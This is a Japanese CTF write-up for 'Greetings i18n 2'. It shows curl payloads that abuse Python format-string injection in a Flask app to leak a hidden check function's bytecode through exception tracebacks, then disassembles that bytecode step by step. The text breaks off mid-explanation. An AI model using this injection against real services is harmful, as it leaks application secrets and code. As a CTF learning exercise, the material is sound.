# Greetings i18n 2 (2026/08/21)

なぜかWriteupが存在しなかったので、書いてみました。

誰でも理解できる事を心掛けました。

...が、流石に内容が難しすぎて、かなり長くなってしまいました。

是非、最後まで見ていってください。

## 問題

> もうブラックボックスなWeb問題を作るのはやめて！

らしいです。自分もエスパー問は嫌いです。

どうやら`Greetings i18n`という問題が過去に出題されていたようです。
[「Greetings i18n」のWriteup（Qiita）](https://qiita.com/Exploder-exe/items/d80cc06d8544177be063)

今回はバージョン2みたいですね。

`Greetings i18n`では、Pythonのフォーマット文字列インジェクションで意図的にエラーを起こし、エラーのオブジェクト属性を辿ることでフラグを取得しているようです。

今回もこの脆弱性が関連しているのでしょうか？

ひょっとしたら塞がれてるかも？

## 概要

ひとまず配布されてるファイルをダウンロードして、中身を見てみます。

- `app.py`
- `check.py`

この2つが配布されていました。

```python
from flask import Flask, request
from check import check

app = Flask(__name__)

translations = {
    "hello": {
        "en": "Hello, {username}!",
        "ja": "こんにちは、{username}さん!"
    },
    "error": {
        "en": "An error has occured: {err}",
        "ja": "エラーが発生しました: {err}",
    }
}


def parse_accept_language() -> str:
    header = request.headers.get("Accept-Language")
    if not header:
        return "en"

    first = header.split(",")[0]
    lang = first.split(";")[0].strip().split("-")[0].strip()

    return lang or "en"

# Translation function
def _(key: str):
    custom = request.form.get(f"custom-{key}")
    if custom:
        return custom
    lang = parse_accept_language()
    return translations.get(key).get(lang, key)


@app.get("/")
def index():
    try:
        username = request.args.get("username", "anonymous user")
        return _("hello").format(username=username), 200, {'Content-Type': 'text/plain;charset=utf-8'}
    except Exception as e:
        return _("error").format(err=e), 500, {'Content-Type': 'text/plain;charset=utf-8'}

@app.post("/check")
def check_post():
    input = request.form.get("input", "")
    if check(input):
        return "That's the correct flag!"
    return "Nope", 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=3000)
```

ひとまず`@app.get("/")`に絞ると、プログラムの流れはこんな感じです。

```text
/?username=ほげほげ
↓
_("hello").format(username=ほげほげ)
↓
_("hello")が開始
↓
custom-{key} つまりcustom-helloの値を取得
↓
存在しない場合、Accept-Languageヘッダで指定された言語を指定する
↓
言語に対応した「"ja": "こんにちは、{username}さん!"」が指定される
↓
"こんにちは、{username}さん!".format(username=ほげほげ)
↓
こんにちは、ほげほげさん!
```

こんな感じです。エラーが道中で発生した場合は

```text
エラー発生
↓
try失敗 except Exception as e に移行
↓
 _("error").format(err=e)が開始
↓
custom-{key} つまりcustom-errorの値を取得
↓
存在しない場合、Accept-Languageヘッダで指定された言語を指定する
↓
言語に対応した「"ja": "エラーが発生しました: {err}"」が指定される
↓
"エラーが発生しました: {err}".format(err=e)
```

ちなみに`.format(username=username)`このようなものを「文字列フォーマット」と呼びます。

文字列中の`{username}`を変数`username`の値で置換する処理であり、例えば

```python
"Hello, {username}".format(username=username)
```

このようにすれば、`username=Alice`の場合、`Hello, Alice`になります。

そして、仮にフォーマット文字列内のフィールド名に対応するキーワード引数が`.format()`に渡されていない場合、エラーとなります。

```python
"Hello, {hoge}".format(username=username)
```

このようにした場合、`KeyError: 'hoge'`が返却されます。

ここ、重要なので覚えていてください。

次に、`@app.post("/check")`はこのようになっています。

```python
@app.post("/check")
def check_post():
    input = request.form.get("input", "")
    if check(input):
        return "That's the correct flag!"
    return "Nope", 500
```

配布されていた`check.py`を見てみましょう。

```python
def check(input):
    return True # This function is different in the remote server.
```

なるほど、必ずTrueが出力されるようです。

恐らくリモートで試すと失敗するんでしょう。確かにこれはブラックボックスだ！

POSTで`input`の値を指定して、それが通れば、その値が正しいフラグであると分かる...ということでしょうか？

ですが、`check`がブラックボックスな以上、何らかの方法を用いて`check`内の処理をリークさせないといけません。

`Greetings i18n`で使われた脆弱性は残っているのでしょうか？

## フォーマット文字列インジェクション

先ほど言ったように、フォーマット文字列内のフィールド名に対応する値が`.format()`に渡されていない場合、エラーが返却されます。

```python
"Hello, {hoge}".format(username=username)
```

そして、今回は`custom-hello`が存在した場合、このようになります。

```python
custom = request.form.get(f"custom-{key}")
if custom:
    return custom
```

そのまま外部入力が返却されるようです。よって、外部入力に`{username}`ではない別の適当なフォーマットを仕込めば、意図的に例外を発生させることができます。

```bash
curl -X GET \
  -d "custom-hello=Hello {hoge}" \
  'http://34.170.146.252:xxxxx/?username=test'
```

## 例外オブジェクトからcheck関数をリーク

さて、ひとまず例外を起こすことに成功しました。次は

```python
except Exception as e:
    return _("error").format(err=e), 500, {'Content-Type': 'text/plain;charset=utf-8'}
```

この処理を考えてみます。

`e`の中には何が入っているのでしょうか？

軽くプログラムを作って確かめてみます。

```python
try:
    "{hoge}".format(username="test")
except Exception as e:
    print(dir(e))
```

`dir`関数は、オブジェクトが持っている属性名やメソッド名の一覧を確認するための組み込み関数です。

出力はこうなりました。

```text
['__cause__', '__class__', '__context__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__setstate__', '__sizeof__', '__str__', '__subclasshook__', '__suppress_context__', '__traceback__', 'args', 'with_traceback']
```

注目するべきは`__traceback__`です。

`__traceback__`には、例外が発生した時点のPython実行環境が入っています。

つまり、その中に`check`関数の情報が入っている可能性があります。

同じように、使える属性名やメソッド名を辿ってみます。

```python
try:
    "{hoge}".format(username="test")
except Exception as e:
    print(dir(e.__traceback__))
```

出力はこうなりました。

```text
['tb_frame', 'tb_lasti', 'tb_lineno', 'tb_next']
```

次に注目するのは`tb_frame`です。

`tb_frame`には、例外が発生した場所の関数実行環境オブジェクトが入っています。

よって、この中にグローバル変数やローカル変数といった情報が入っている可能性があります。

どんどん行きましょう。

```python
try:
    "{hoge}".format(username="test")
except Exception as e:
    print(dir(e.__traceback__.tb_frame))
```

出力はこうなりました。

```text
['__class__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'clear', 'f_back', 'f_builtins', 'f_code', 'f_globals', 'f_lasti', 'f_lineno', 'f_locals', 'f_trace', 'f_trace_lines', 'f_trace_opcodes']
```

今度は多いですね。

注目すべきは`f_globals`です。

`f_globals`は、そのフレームが属しているモジュールのグローバル名前空間を辞書として持っています。

つまり単純な話

```python
{
    "FLAG": "secret",
    "check": <function check>
}
```

みたいなキーがあるかもしれません。

```python
def check():
    return True

FLAG = "secret"

try:
    "{hoge}".format(username="test")
except Exception as e:
    fg = e.__traceback__.tb_frame.f_globals
    print(fg.keys())
```

適当に`check`関数や`FLAG`変数を定義して、キーを抽出してみます。

```text
dict_keys(['__name__', '__doc__', '__package__', '__loader__', '__spec__', '__annotations__', '__builtins__', '__file__', '__cached__', 'check', 'FLAG', 'e', 'fg'])
```

恐らく本番でも`check`は存在するでしょう。よって

```python
err.__traceback__.tb_frame.f_globals[check]
```

を用いれば、check関数の情報を取得できると思われます。

使えるものを探していきましょう。

```python
def check():
    return True

FLAG = "secret"

try:
    "{hoge}".format(username="test")
except Exception as e:
    fg = e.__traceback__.tb_frame.f_globals
    print(dir(fg["check"]))
```

出力はこうなりました。

```text
['__annotations__', '__builtins__', '__call__', '__class__', '__closure__', '__code__', '__defaults__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__get__', '__getattribute__', '__globals__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__kwdefaults__', '__le__', '__lt__', '__module__', '__name__', '__ne__', '__new__', '__qualname__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__']
```

名前から分かるように、今回は`__code__`です。

`__code__`には、その関数のコード情報が入っています。

サクサク行きましょう。

```python
def check():
    return True

FLAG = "secret"

try:
    "{hoge}".format(username="test")
except Exception as e:
    fg = e.__traceback__.tb_frame.f_globals["check"].__code__
    print(dir(fg))
```

結果はこんな感じです。

```text
['__class__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'co_argcount', 'co_cellvars', 'co_code', 'co_consts', 'co_filename', 'co_firstlineno', 'co_flags', 'co_freevars', 'co_kwonlyargcount', 'co_lines', 'co_linetable', 'co_lnotab', 'co_name', 'co_names', 'co_nlocals', 'co_posonlyargcount', 'co_stacksize', 'co_varnames', 'replace']
```

長かったです。これにて、ようやくパズルのピースが出揃いました...！

今回使っていくのは、この4つです。

- `co_names` → グローバル変数名、関数名、属性名など名前の一覧
- `co_consts` → その関数の中で使われる定数の一覧
- `co_varnames` → その関数のローカル変数名と引数名の一覧
- `co_code` → バイトコード本体

`co_code`だけでいいじゃん！という声が出てくるかもしれませんが、これだと命令列だけになってしまうので、名前や変数、定数の実体が読み取れません。

上記3つを特定し、それを元に命令列を読むことで、`check`関数の処理を推測してみましょう。

## ペイロード送信

フォーマット文字列インジェクションを起こす`custom-hello`とは違い、`custom-error`は先ほど説明した正規の手段(?)で`check`関数の情報をリークさせます。

具体的なペイロードはこのようになります。

```bash
curl -X GET \
  --data-urlencode 'custom-hello=HELLO {hoge}' \
  --data-urlencode 'custom-error={err.__traceback__.tb_frame.f_globals[check].__code__.co_names}' \
  'http://34.170.146.252:xxxxx/?username=test'
```

ひとまず`co_names`をリークしてみます。

```text
('len', 'bytes', 'range', 'ord')
```

おお、出てきました。

`len`ということは`input`のサイズ比較でもするのでしょうか？

また、`range`もありますね。繰り返しの処理かな？

あとは`ord`も気になるところです。整数変換...？

```bash
curl -X GET \
  --data-urlencode 'custom-hello=HELLO {hoge}' \
  --data-urlencode 'custom-error={err.__traceback__.tb_frame.f_globals[check].__code__.co_consts}' \
  'http://34.170.146.252:xxxxx/?username=test'
```

次に`co_consts`をリークします。

```text
(50, False, slice(None, None, 3), 'Aa{5MgRJnYIHKk4GA', None, '}Eq4CBLZgRlZqs7cl', 256, b'\xbcrQ5\xc1\xfc\x07#\xfa\xac\xfc\xcd\x98_>\x02', True, -3)
```

うおー！なんか絶妙にフラグらしきものが出てきました。

```text
'Aa{5MgRJnYIHKk4GA'
'}Eq4CBLZgRlZqs7cl'
```

どうやら3文字おきに取得しているようです。

並び替えてみると`Al?ac?{7?5s?Mq?gZ?Rl?JR?ng?YZ?IL?HB?KC?k4?4q?GE?A}`になりました。

不明な文字列が16文字ありますね。

`b'\xbcrQ5\xc1\xfc\x07#\xfa\xac\xfc\xcd\x98_>\x02'`とあります。

こちらのバイト列は、いったい何なのでしょうか？

```bash
curl -X GET \
  --data-urlencode 'custom-hello=HELLO {hoge}' \
  --data-urlencode 'custom-error={err.__traceback__.tb_frame.f_globals[check].__code__.co_varnames}' \
  'http://34.170.146.252:xxxxx/?username=test'
```

次にリークするのは`co_varnames`です。

```text
('input', 'i')
```

おお、ここで`input`が登場しましたね。

`i`は先ほどリークされた`range`に使うものでしょうか？

```bash
curl -X GET \
  --data-urlencode 'custom-hello=HELLO {hoge}' \
  --data-urlencode 'custom-error={err.__traceback__.tb_frame.f_globals[check].__code__.co_code}' \
  'http://34.170.146.252:xxxxx/?username=test'
```

そして最後にトリである生バイトコードを取得します。

```text
b'\x80\x00\\\x01\x00\x00\x00\x00\x00\x00\x00\x00V\x004\x01\x00\x00\x00\x00\x00\x00^28w\x00\x00d\x03\x00\x00\x1c\x00R\x01#\x00V\x00R\x02,\x1a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00R\x038w\x00\x00d\x03\x00\x00\x1c\x00R\x01#\x00V\x00R\x04R\x04R\t1\x03,\x1a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00R\x058w\x00\x00d\x03\x00\x00\x1c\x00R\x01#\x00\\\x03\x00\x00\x00\x00\x00\x00\x00\x00\\\x05\x00\x00\x00\x00\x00\x00\x00\x00^\x104\x01\x00\x00\x00\x00\x00\x00\x10\x00U\x01u\x02.\x00u\x02F\x94\x00\x00p\x01^\x07\\\x07\x00\x00\x00\x00\x00\x00\x00\x00W\x01^\x03,\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00,\x1a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x004\x01\x00\x00\x00\x00\x00\x00,\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00R\x06,\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00^\x05\\\x07\x00\x00\x00\x00\x00\x00\x00\x00W\x01^\x03,\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00^\x01,\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00,\x1a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x004\x01\x00\x00\x00\x00\x00\x00,\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00R\x06,\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00,\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00^\x03\\\x07\x00\x00\x00\x00\x00\x00\x00\x00W\x01^\x03,\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00^\x02,\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00,\x1a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x004\x01\x00\x00\x00\x00\x00\x00,\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00^\x17,\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00R\x06,\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00,\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00N\x02K\x96\x00\x00\t\x00\x1e\x00u\x02p\x014\x01\x00\x00\x00\x00\x00\x00R\x078w\x00\x00d\x03\x00\x00\x1c\x00R\x01#\x00R\x08#\x00u\x02\x1f\x00u\x02p\x01i\x00'
```

うおおなんかすごい出てきた！

これらの情報を用いて逆アセンブルを行います。

逆アセンブルには`dis`モジュールを用います。

```python
import dis

leaked_code = b'\x80\x00\\\x01\x00\x00\x00\x00\x00\x00\x00\x00V\x004\x01\x00\x00\x00\x00\x00\x00^28w\x00\x00d\x03\x00\x00\x1c\x00R\x01#\x00V\x00R\x02,\x1a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00R\x038w\x00\x00d\x03\x00\x00\x1c\x00R\x01#\x00V\x00R\x04R\x04R\t1\x03,\x1a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00R\x058w\x00\x00d\x03\x00\x00\x1c\x00R\x01#\x00\\\x03\x00\x00\x00\x00\x00\x00\x00\x00\\\x05\x00\x00\x00\x00\x00\x00\x00\x00^\x104\x01\x00\x00\x00\x00\x00\x00\x10\x00U\x01u\x02.\x00u\x02F\x94\x00\x00p\x01^\x07\\\x07\x00\x00\x00\x00\x00\x00\x00\x00W\x01^\x03,\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00,\x1a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x004\x01\x00\x00\x00\x00\x00\x00,\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00R\x06,\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00^\x05\\\x07\x00\x00\x00\x00\x00\x00\x00\x00W\x01^\x03,\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00^\x01,\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00,\x1a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x004\x01\x00\x00\x00\x00\x00\x00,\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00R\x06,\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00,\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00^\x03\\\x07\x00\x00\x00\x00\x00\x00\x00\x00W\x01^\x03,\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00^\x02,\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00,\x1a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x004\x01\x00\x00\x00\x00\x00\x00,\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00^\x17,\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00R\x06,\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00,\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00N\x02K\x96\x00\x00\t\x00\x1e\x00u\x02p\x014\x01\x00\x00\x00\x00\x00\x00R\x078w\x00\x00d\x03\x00\x00\x1c\x00R\x01#\x00R\x08#\x00u\x02\x1f\x00u\x02p\x01i\x00'

leaked_consts = (
    50,
    False,
    slice(None, None, 3),
    'Aa{5MgRJnYIHKk4GA',
    None,
    '}Eq4CBLZgRlZqs7cl',
    256,
    b'\xbc\x72\x51\x35\xc1\xfc\x07\x23\xfa\xac\xfc\xcd\x98\x5f\x3e\x02',
    True,
    -3,
)

leaked_names = (
    'len',
    'bytes',
    'range',
    'ord',
)

leaked_varnames = (
    'input',
    'i',
)

def dummy(input):
    i = None
    return input

reconstructed_code = dummy.__code__.replace(
    co_code=leaked_code,
    co_consts=leaked_consts,
    co_names=leaked_names,
    co_varnames=leaked_varnames,
    co_argcount=1,
    co_posonlyargcount=0,
    co_kwonlyargcount=0,
    co_nlocals=2,
    co_stacksize=32,
)

dis.dis(reconstructed_code, show_caches=False)
```

適当に`dummy`関数を用意して、そのコードオブジェクトを土台に、リークした`co_code`、`co_consts`、`co_names`、`co_varnames`などへ置き換えることで、元の関数のコードオブジェクトを再構築した上で、逆アセンブルを行います。

このコードはAIが一瞬で作ってくれました...泣

## 逆アセンブルでフラグ特定

ここからは逆アセンブルの時間です。

現時点でだいぶ長くなってしまいましたが、ここまで来たらちゃんとやり切りたいと思います。

まず、逆アセンブル結果はこのようになりました。

```text
 32           RESUME                   0

 33           LOAD_GLOBAL              1 (len + NULL)
              LOAD_FAST_BORROW         0 (input)
              CALL                     1
              LOAD_SMALL_INT          50
              COMPARE_OP             119 (bool(!=))
              POP_JUMP_IF_FALSE        3 (to L1)
              NOT_TAKEN
              LOAD_CONST               1 (False)
              RETURN_VALUE
      L1:     LOAD_FAST_BORROW         0 (input)
              LOAD_CONST               2 (slice(None, None, 3))
              BINARY_OP               26 ([])
              LOAD_CONST               3 ('Aa{5MgRJnYIHKk4GA')
              COMPARE_OP             119 (bool(!=))
              POP_JUMP_IF_FALSE        3 (to L2)
              NOT_TAKEN
              LOAD_CONST               1 (False)
              RETURN_VALUE
      L2:     LOAD_FAST_BORROW         0 (input)
              LOAD_CONST               4 (None)
              LOAD_CONST               4 (None)
              LOAD_CONST               9 (-3)
              BUILD_SLICE              3
              BINARY_OP               26 ([])
              LOAD_CONST               5 ('}Eq4CBLZgRlZqs7cl')
              COMPARE_OP             119 (bool(!=))
              POP_JUMP_IF_FALSE        3 (to L3)
              NOT_TAKEN
              LOAD_CONST               1 (False)
              RETURN_VALUE
      L3:     LOAD_GLOBAL              3 (bytes + NULL)
              LOAD_GLOBAL              5 (range + NULL)
              LOAD_SMALL_INT          16
              CALL                     1
              GET_ITER
              LOAD_FAST_AND_CLEAR      1 (i)
              SWAP                     2
              BUILD_LIST               0
              SWAP                     2
      L4:     FOR_ITER               148 (to L5)
              STORE_FAST               1 (i)
              LOAD_SMALL_INT           7
              LOAD_GLOBAL              7 (ord + NULL)
              LOAD_FAST_BORROW_LOAD_FAST_BORROW 1 (input, i)
              LOAD_SMALL_INT           3
              BINARY_OP                5 (*)
              BINARY_OP               26 ([])
              CALL                     1
              BINARY_OP                5 (*)
              LOAD_CONST               6 (256)
              BINARY_OP                6 (%)
              LOAD_SMALL_INT           5
              LOAD_GLOBAL              7 (ord + NULL)
              LOAD_FAST_BORROW_LOAD_FAST_BORROW 1 (input, i)
              LOAD_SMALL_INT           3
              BINARY_OP                5 (*)
              LOAD_SMALL_INT           1
              BINARY_OP                0 (+)
              BINARY_OP               26 ([])
              CALL                     1
              BINARY_OP                5 (*)
              LOAD_CONST               6 (256)
              BINARY_OP                6 (%)
              BINARY_OP               12 (^)
              LOAD_SMALL_INT           3
              LOAD_GLOBAL              7 (ord + NULL)
              LOAD_FAST_BORROW_LOAD_FAST_BORROW 1 (input, i)
              LOAD_SMALL_INT           3
              BINARY_OP                5 (*)
              LOAD_SMALL_INT           2
              BINARY_OP                0 (+)
              BINARY_OP               26 ([])
              CALL                     1
              BINARY_OP                5 (*)
              LOAD_SMALL_INT          23
              BINARY_OP                0 (+)
              LOAD_CONST               6 (256)
              BINARY_OP                6 (%)
              BINARY_OP               12 (^)
              LIST_APPEND              2
              JUMP_BACKWARD          150 (to L4)
      L5:     END_FOR
              POP_ITER
              SWAP                     2
              STORE_FAST               1 (i)
              CALL                     1
              LOAD_CONST               7 (b'\xbcrQ5\xc1\xfc\x07#\xfa\xac\xfc\xcd\x98_>\x02')
              COMPARE_OP             119 (bool(!=))
              POP_JUMP_IF_FALSE        3 (to L6)
              NOT_TAKEN
              LOAD_CONST               1 (False)
              RETURN_VALUE
      L6:     LOAD_CONST               8 (True)
              RETURN_VALUE
              SWAP                     2
              POP_TOP
              SWAP                     2
              STORE_FAST               1 (i)
              RERAISE                  0
```

長いしよくわからん。なにこれ？

意地でも読みたくない。AIにやらせたら一瞬でしょうけど、負けた気がするので愚直にいきます。

上から1命令ずつ読んでいきましょう。

その前に、Pythonのバイトコードを読む上で一番重要な「スタック」を軽く理解しておきます。

## スタックってなんだろう？

Pythonのバイトコードは、計算途中の値を「スタック」という場所に一時的に積みながら処理を進めます。

例えば、

```python
7 * 3
```

を計算する場合、イメージとしては

```text
[]
↓ 7を積む
[7]
↓ 3を積む
[7, 3]
↓ 上の2つを掛ける
[21]
```

となります。

この記事では、**右端をスタックの一番上**として書きます。

つまり

```text
[A, B, C]
```

なら、一番上にある値は`C`です。

よく出てくる命令は、ひとまずこのくらい覚えておけば大丈夫だと思います。

この辺から自分でもよくわかってないので、ミスがあったらごめんなさい。

```text
LOAD_XXX
→ 値をスタックに積む

STORE_XXX
→ スタックの一番上を取り出して変数へ保存する

BINARY_OP
→ スタック上の上2つを取り出して演算し、結果を積む

CALL n
→ 直前にスタックへ用意された関数をn個の引数で呼び出す

SWAP n
→ スタックの一番上と、上からn番目を交換する
```

また、`LOAD_GLOBAL 1 (len + NULL)`のように`NULL`が出てきます。

これは`None`ではなく、CPythonが関数呼び出しのために使う内部的な目印です。

お約束のようなものだと認識していただいて大丈夫です...多分...？

関数呼び出し時は、ざっくり

```text
[関数, NULL, 引数]
```

という並びを作ってから`CALL`します。

例えば、

```text
[len, NULL, input]
CALL 1
```

なら

```python
len(input)
```

となります。

では、本題に入ります。

---

### `RESUME 0`

```text
RESUME 0
```

関数の実行開始地点を示す命令です。

今回の処理を理解する上では、特に何か計算しているわけではありません。

```text
実行前
[]

実行後
[]
```

スタックに変化はありません。

ちなみに逆アセンブル結果の左に出ている`32`や`33`はソースコードの行番号情報です。

今回は`dummy`関数のコードオブジェクトを土台にしているため、元の`check.py`の行番号として読む必要はありません。

---

## 最初の条件 `len(input) != 50`

### `LOAD_GLOBAL 1 (len + NULL)`

```text
LOAD_GLOBAL 1 (len + NULL)
```

グローバル領域から`len`を取得します。

同時に、関数呼び出し用の`NULL`も積まれます。

```text
実行前
[]

実行後
[len, NULL]
```

---

### `LOAD_FAST_BORROW 0 (input)`

```text
LOAD_FAST_BORROW 0 (input)
```

ローカル変数`input`をスタックへ積みます。

`BORROW`はCPython内部の参照管理に関する違いなので、今回の逆アセンブルを読む上では普通の「inputをロードする」と考えて大丈夫です。

```text
実行前
[len, NULL]

実行後
[len, NULL, input]
```

---

### `CALL 1`

```text
CALL 1
```

引数を1つ使って、直前に準備されている関数を呼び出します。

現在のスタックは

```text
[len, NULL, input]
```

なので、呼び出されるのは

```python
len(input)
```

です。

例えば`input`の長さが50なら

```text
実行前
[len, NULL, input]

実行後
[50]
```

となります。

`len`も`NULL`も`input`もCALLで消費され、戻り値だけがスタックへ残ります。

---

### `LOAD_SMALL_INT 50`

```text
LOAD_SMALL_INT 50
```

整数`50`を積みます。

```text
実行前
[len(input)]

実行後
[len(input), 50]
```

---

### `COMPARE_OP 119 (bool(!=))`

```text
COMPARE_OP 119 (bool(!=))
```

スタックの上2つを`!=`で比較します。

```text
実行前
[len(input), 50]

実行後
[len(input) != 50]
```

例えば長さが50なら

```text
[False]
```

になります。

---

### `POP_JUMP_IF_FALSE 3 (to L1)`

```text
POP_JUMP_IF_FALSE 3 (to L1)
```

スタックの一番上を取り出し、`False`なら`L1`へ移動します。

長さが50なら

```python
len(input) != 50
```

は`False`です。

よって`L1`へ進みます。

```text
実行前
[False]

実行後
[]
```

逆に長さが50でない場合は`True`なので、ジャンプせず次の命令へ進みます。

---

### `NOT_TAKEN`

```text
NOT_TAKEN
```

分岐の記録などに使われる内部命令です。

今回の処理内容には影響しません。

```text
実行前
[]

実行後
[]
```

---

### `LOAD_CONST 1 (False)`

```text
LOAD_CONST 1 (False)
```

`False`を積みます。

```text
実行前
[]

実行後
[False]
```

---

### `RETURN_VALUE`

```text
RETURN_VALUE
```

スタックの一番上を関数の戻り値として返します。

```text
実行前
[False]

実行後
関数終了
```

つまり、ここまでを普通のPythonへ戻すと

```python
if len(input) != 50:
    return False
```

です。

まず、フラグの長さが50文字であることが分かりました。

でも、まだまだ条件があるみたいです。

次に行きましょう。

---

## L1 `input[::3]`の比較

### `LOAD_FAST_BORROW 0 (input)`

```text
LOAD_FAST_BORROW 0 (input)
```

`input`を積みます。

```text
実行前
[]

実行後
[input]
```

---

### `LOAD_CONST 2 (slice(None, None, 3))`

```text
LOAD_CONST 2 (slice(None, None, 3))
```

`slice(None, None, 3)`を積みます。

これはPythonのスライス記法で書くと

```python
[::3]
```

です。

```text
実行前
[input]

実行後
[input, slice(None, None, 3)]
```

---

### `BINARY_OP 26 ([])`

```text
BINARY_OP 26 ([])
```

スタック上の

```text
input
slice(None, None, 3)
```

を使って添字アクセスします。

```text
実行前
[input, slice(None, None, 3)]

実行後
[input[::3]]
```

---

### `LOAD_CONST 3 ('Aa{5MgRJnYIHKk4GA')`

```text
LOAD_CONST 3 ('Aa{5MgRJnYIHKk4GA')
```

ここで、フラグの断片らしき文字列を積みます。

```text
実行前
[input[::3]]

実行後
[input[::3], 'Aa{5MgRJnYIHKk4GA']
```

---

### `COMPARE_OP 119 (bool(!=))`

```text
COMPARE_OP 119 (bool(!=))
```

上2つを`!=`で比較します。

```text
実行前
[input[::3], 'Aa{5MgRJnYIHKk4GA']

実行後
[input[::3] != 'Aa{5MgRJnYIHKk4GA']
```

---

### `POP_JUMP_IF_FALSE 3 (to L2)`

```text
POP_JUMP_IF_FALSE 3 (to L2)
```

比較結果が`False`、つまり2つが等しい場合は`L2`へ進みます。

```text
実行前
[比較結果]

実行後
[]
```

したがって条件は

```python
input[::3] == 'Aa{5MgRJnYIHKk4GA'
```

となります。


---

### `NOT_TAKEN`

```text
NOT_TAKEN
```

内部用の命令なのでスタックに変化はありません。

```text
[]
→
[]
```

---

### `LOAD_CONST 1 (False)`

```text
LOAD_CONST 1 (False)
```

比較に失敗した場合の戻り値`False`を積みます。

```text
[]
→
[False]
```

---

### `RETURN_VALUE`

```text
RETURN_VALUE
```

`False`を返します。

つまりL1は

```python
if input[::3] != 'Aa{5MgRJnYIHKk4GA':
    return False
```

です。

ここまでは、まだギリギリ理解できます。

次も、結構似たような処理が続きます。

---

## L2 `input[::-3]`の比較

### `LOAD_FAST_BORROW 0 (input)`

```text
LOAD_FAST_BORROW 0 (input)
```

```text
[]
→
[input]
```

---

### 1つ目の `LOAD_CONST 4 (None)`

```text
LOAD_CONST 4 (None)
```

```text
[input]
→
[input, None]
```

---

### 2つ目の `LOAD_CONST 4 (None)`

```text
LOAD_CONST 4 (None)
```

```text
[input, None]
→
[input, None, None]
```

---

### `LOAD_CONST 9 (-3)`

```text
LOAD_CONST 9 (-3)
```

```text
[input, None, None]
→
[input, None, None, -3]
```

---

### `BUILD_SLICE 3`

```text
BUILD_SLICE 3
```

上3つ

```text
None
None
-3
```

から

```python
slice(None, None, -3)
```

を作ります。

```text
実行前
[input, None, None, -3]

実行後
[input, slice(None, None, -3)]
```

これはPythonで書けば

```python
[::-3]
```

です。

さっきと似たようなものですが、こちらはマイナスが付いています。

---

### `BINARY_OP 26 ([])`

```text
BINARY_OP 26 ([])
```

`input`に先ほどのスライスを適用します。

```text
実行前
[input, slice(None, None, -3)]

実行後
[input[::-3]]
```

---

### `LOAD_CONST 5 ('}Eq4CBLZgRlZqs7cl')`

```text
LOAD_CONST 5 ('}Eq4CBLZgRlZqs7cl')
```

```text
[input[::-3]]
→
[input[::-3], '}Eq4CBLZgRlZqs7cl']
```

---

### `COMPARE_OP 119 (bool(!=))`

```text
COMPARE_OP 119 (bool(!=))
```

```text
[input[::-3], '}Eq4CBLZgRlZqs7cl']
→
[input[::-3] != '}Eq4CBLZgRlZqs7cl']
```

---

### `POP_JUMP_IF_FALSE 3 (to L3)`

```text
POP_JUMP_IF_FALSE 3 (to L3)
```

比較結果を取り出し、`False`ならL3へ進みます。

```text
[比較結果]
→
[]
```

つまり、

```python
input[::-3] == '}Eq4CBLZgRlZqs7cl'
```

なら次へ進みます。

マイナスが付いているため、リストの末尾から3つおきに要素が取得されます。

---

### `NOT_TAKEN`

```text
[]
→
[]
```

特に処理はありません。

---

### `LOAD_CONST 1 (False)`

```text
[]
→
[False]
```

---

### `RETURN_VALUE`

比較に失敗した場合、

```python
return False
```

です。

つまりL2全体は

```python
